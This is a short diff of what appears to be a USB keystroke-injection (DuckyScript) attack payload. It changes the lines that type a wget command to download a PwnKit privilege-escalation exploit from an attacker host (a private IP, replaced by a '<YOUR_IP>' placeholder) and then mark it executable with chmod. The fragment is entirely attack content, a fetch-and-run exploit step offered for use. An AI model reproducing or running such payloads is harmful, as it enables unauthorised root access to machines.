@@ -16,7 +16,7 @@ ENTER
 
 DELAY 100
 
-STRING wget http://192.168.1.2:12/pwnkit
+STRING wget http://<YOUR_IP>/pwnkit_poc
 
 DELAY 1000
 
@@ -24,7 +24,7 @@ ENTER
 
 DELAY 1500
 
-STRING chmod +x pwnkit
+STRING chmod +x pwnkit_poc
 
 DELAY 150
 
